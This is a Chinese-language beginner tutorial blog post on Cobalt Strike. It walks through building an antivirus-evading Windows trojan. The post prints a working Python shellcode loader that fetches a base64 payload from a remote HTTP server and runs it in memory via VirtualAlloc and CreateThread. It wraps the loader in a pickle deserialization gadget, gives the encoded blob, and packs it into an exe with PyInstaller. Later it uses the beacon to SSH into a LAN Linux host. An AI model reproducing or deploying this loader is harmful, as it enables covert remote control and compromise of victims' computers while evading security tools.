## 前言

最近刚开始使用Cobaltstrike工具，感觉很方便，这里进行记录刚开始使用的教程，并且参考师傅资料进行制作可以绕过检测工具的windows木马，在windows的会话中使用beacon远程同局域网Linux，适合刚知道Cobaltstrike是什么的新手食用（比如我QAQ）。表述不正确的地方请师傅们多多指正。

## 使用环境

Windows2016服务器、jdk-8u271-windows-x64、Cobaltstrike4.0、python3

其中jdk和python3需要配置环境变量，检查方式

![1613702358_602f24d6763cdc3533a73.png!small?1613702359671](https://image.3001.net/images/20210219/1613702358_602f24d6763cdc3533a73.png!small?1613702359671)

![1613702383_602f24ef1473ee97d0734.png!small?1613702384536](https://image.3001.net/images/20210219/1613702383_602f24ef1473ee97d0734.png!small?1613702384536)

## Cobaltstrike4.0启动教程

### 1\. 开启服务端，并设置远控服务端的ip地址、密码

这里的192.168.1.123是本机的ip地址，123456是开启CS客户端要输入的密码

    
    
    teamserver.bat 192.168.1.123 123456

![1613702910_602f26fe12d63cb936199.png!small?1613702911281](https://image.3001.net/images/20210219/1613702910_602f26fe12d63cb936199.png!small?1613702911281)

### 2\. 启动客户端连接（这里与服务端在同一个服务器）

点击启动文件start.bat

![1613703062_602f2796bb273abccf049.png!small?1613703063976](https://image.3001.net/images/20210219/1613703062_602f2796bb273abccf049.png!small?1613703063976)

### 3\. 输入信息进行连接服务端

![1613703265_602f28615d13741107993.png!small?1613703266747](https://image.3001.net/images/20210219/1613703265_602f28615d13741107993.png!small?1613703266747)

### 4\. 显示主界面

![1613703352_602f28b89165d37c6e7bd.png!small?1613703353764](https://image.3001.net/images/20210219/1613703352_602f28b89165d37c6e7bd.png!small?1613703353764)

## cobaltstrike制作Windows木马

[参考文章：https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w](https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w)

### 1\. 使用cobaltstrike生成一个python脚本的payload

（1）选择’攻击‘--‘后门--‘Payload Generator’

![1613703664_602f29f059662104de3f2.png!small?1613703665548](https://image.3001.net/images/20210219/1613703664_602f29f059662104de3f2.png!small?1613703665548)

（2）选择监听器进行添加

![1613703993_602f2b39a3fa6054880b5.png!small?1613703994853](https://image.3001.net/images/20210219/1613703993_602f2b39a3fa6054880b5.png!small?1613703994853)

（3）点击Add添加

![1613704030_602f2b5e86da565f37a9d.png!small?1613704031689](https://image.3001.net/images/20210219/1613704030_602f2b5e86da565f37a9d.png!small?1613704031689)

（4）设置参数

名字设置，payload默认，HTTP Hosts添加服务端ip，HTTP Host(Stager)填写服务端ip，点击save

![1613704296_602f2c68570600ba994f2.png!small?1613704297638](https://image.3001.net/images/20210219/1613704296_602f2c68570600ba994f2.png!small?1613704297638)

（5）选择添加的payload

点击Choose选择

![1613704436_602f2cf4d7d3896bafb52.png!small?1613704438057](https://image.3001.net/images/20210219/1613704436_602f2cf4d7d3896bafb52.png!small?1613704438057)

（6）设置参数

输出选择脚本类型为python，勾选64位系统，点击Generate生成payload

![1613704488_602f2d284f918306bc55d.png!small?1613704489639](https://image.3001.net/images/20210219/1613704488_602f2d284f918306bc55d.png!small?1613704489639)

（7）选择路径保存即可

![1613704571_602f2d7ba0391eda34400.png!small?1613704572983](https://image.3001.net/images/20210219/1613704571_602f2d7ba0391eda34400.png!small?1613704572983)

（8）查看payload文件

![1613704939_602f2eebb4c3410ec8358.png!small](https://image.3001.net/images/20210219/1613704939_602f2eebb4c3410ec8358.png!small)

（9）[将16进制解码看一下内容](https://www.mokuge.com/tool/js_x16/)

![1613704973_602f2f0dbec4c11e4bd4d.png!small?1613704975014](https://image.3001.net/images/20210219/1613704973_602f2f0dbec4c11e4bd4d.png!small?1613704975014)

### 2\. 复制里面的payload进行Base64编码

[使用在线网站进行编码](https://base64.us/)

![1613705132_602f2fac5d065f71db2f8.png!small?1613705133814](https://image.3001.net/images/20210219/1613705132_602f2fac5d065f71db2f8.png!small?1613705133814)

### 3\. 使用python生成http服务，使base64编码内容可以使用url读取

将base64编码内容放在1.txt中，在当前文件夹中使用python3生成http服务

    
    
    python -m http.server 8000

![1613705497_602f3119c536e58b1f3c0.png!small?1613705498940](https://image.3001.net/images/20210219/1613705497_602f3119c536e58b1f3c0.png!small?1613705498940)

### 4\. 把地址复制 进行反序列化

    
    
    import base64
    import pickle
    shellcode = """
    import ctypes,urllib.request,codecs,base64
    
    shellcode = urllib.request.urlopen('http://192.168.1.123:8000/1.txt').read()
    shellcode = base64.b64decode(shellcode)
    shellcode =codecs.escape_decode(shellcode)[0]
    shellcode = bytearray(shellcode)
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    
    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr), 
        buf, 
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.c_uint64(ptr), 
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""
    
    
    class A(object):
        def __reduce__(self):
            return (exec, (shellcode,))
    
    
    ret = pickle.dumps(A())
    ret_base64 = base64.b64encode(ret)
    print(ret_base64)
    #ret_decode = base64.b64decode(ret_base64)

将url修改为自己的

![1613705914_602f32badc0db96e70959.png!small?1613705916313](https://image.3001.net/images/20210219/1613705914_602f32badc0db96e70959.png!small?1613705916313)

### 5\. 运行脚本，得到反序列化之后的内容

![1613706397_602f349d188704267da22.png!small?1613706398320](https://image.3001.net/images/20210219/1613706397_602f349d188704267da22.png!small?1613706398320)

### 6\. 将内容复制到脚本中进行运行

    
    
    import base64,pickle,ctypes,urllib.request  
    shellcode =b'gANjYnVpbHRpbnMKZXhlYwpxAFgyBAAACmltcG9ydCBjdHlwZXMsdXJsbGliLnJlcXVlc3QsY29kZWNzLGJhc2U2NAoKc2hlbGxjb2RlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovLzEuMTUuMTA3LjQ0OjgwMDAvMS50eHQnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5jX2ludCgweDQwKSkKCiMg5pS+5YWlc2hlbGxjb2RlCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgYnVmLCAKICAgIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkKKQojIOWIm+W7uuS4gOS4que6v+eoi+S7jnNoZWxsY29kZemYsuatouS9jee9rummluWcsOWdgOW8gOWni+aJp+ihjApoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMucG9pbnRlcihjdHlwZXMuY19pbnQoMCkpCikKIyDnrYnlvoXkuIrpnaLliJvlu7rnmoTnur/nqIvov5DooYzlrowKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGN0eXBlcy5jX2ludChoYW5kbGUpLGN0eXBlcy5jX2ludCgtMSkpcQGFcQJScQMu'  
    pickle.loads(base64.b64decode(shellcode))

### 7\. 发现CS中已经自动上线了一台资产

![1613706608_602f3570eb73b969ad5c3.png!small?1613706610548](https://image.3001.net/images/20210219/1613706608_602f3570eb73b969ad5c3.png!small?1613706610548)

### 8\. 使用pyinstaller将脚本打包为exe

    
    
    pyinstaller -F 2.py  -i "3.ico" --key sdfS56DFGE65#d12@sc

这里需要注意参数

> -i指定ico图片文件的时候，文件一定要格式正确，不然会打包失败。可以找一个已有的保存下来使用
>
> -F指定文件名
>
> \--key指定key值

### 9\. exe文件在dist文件夹中

![1613709167_602f3f6f8e05c15aa6cb1.png!small?1613709169153](https://image.3001.net/images/20210219/1613709167_602f3f6f8e05c15aa6cb1.png!small?1613709169153)

### 10\. 找小伙伴运行一下

成功上线

![1613709400_602f405882001680062a4.png!small?1613709401754](https://image.3001.net/images/20210219/1613709400_602f405882001680062a4.png!small?1613709401754)

## cobaltstrike主界面快捷图标

[参考：https://blog.csdn.net/qq_26091745/article/details/98109250](https://blog.csdn.net/qq_26091745/article/details/98109250)

## 在windows的会话中使用beacon远程同局域网Linux

### 1\. 进入beacon

![1613716079_602f5a6f4ab5f2a086069.png!small?1613716080575](https://image.3001.net/images/20210219/1613716079_602f5a6f4ab5f2a086069.png!small?1613716080575)

![1613716072_602f5a68087315168d164.png!small?1613716073308](https://image.3001.net/images/20210219/1613716072_602f5a68087315168d164.png!small?1613716073308)

### 2\. 执行命令远程

    
    
    ssh 10.1.1.7:22 root root

参数：

> ssh ip:port username password

![1613717736_602f60e85e80b8858613b.png!small?1613717737939](https://image.3001.net/images/20210219/1613717736_602f60e85e80b8858613b.png!small?1613717737939)

### 3\. 执行shell命令

格式：shell command

如：shell whoami 当前用户  
![1613717548_602f602ca28de7d0f5577.png!small?1613717550073](https://image.3001.net/images/20210219/1613717548_602f602ca28de7d0f5577.png!small?1613717550073)

### 4\. 查看Pivot Graph(拓扑图)

![1613717646_602f608eecd9f26757182.png!small?1613717648463](https://image.3001.net/images/20210219/1613717646_602f608eecd9f26757182.png!small?1613717648463)

## 总结

CS在使用中很方便，其他更多的功能后面继续探索~

## 参考

[bypass技巧](https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w)

[Cobaltstrike菜单栏与视图﻿](https://blog.csdn.net/qq_26091745/article/details/98109250)

#

